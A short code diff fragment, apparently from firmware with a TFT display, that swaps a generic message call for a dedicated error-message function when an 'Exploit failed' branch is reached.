         } else {
-            showAdaptiveMessage("Exploit failed", "OK", "", "", TFT_RED);
+            showErrorMessage("Exploit failed");
         }
     }});
 
